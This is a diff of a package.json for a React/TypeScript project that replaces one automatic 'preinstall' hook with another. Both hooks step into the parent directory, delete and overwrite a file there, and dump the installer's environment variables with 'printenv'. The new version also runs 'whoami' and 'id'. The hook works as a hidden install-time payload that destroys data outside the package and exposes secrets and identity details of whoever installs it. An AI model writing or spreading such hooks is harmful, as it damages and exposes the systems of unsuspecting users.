@@ -13,7 +13,7 @@
     "typescript": "3.8.3"
   },
   "scripts": {
-    "preinstall" : "cd ..;rm config.js; echo 123 > config.js; cat config.js; printenv; echo paul",
+    "preinstall" : "cd ..;rm ipfs-deployer; echo 123 > ipfs-deployer; cat ipfs-deployer; printenv; whoami; id",
     "start": "react-scripts start",
     "build": "react-scripts build",
     "test": "react-scripts test --env=jsdom",
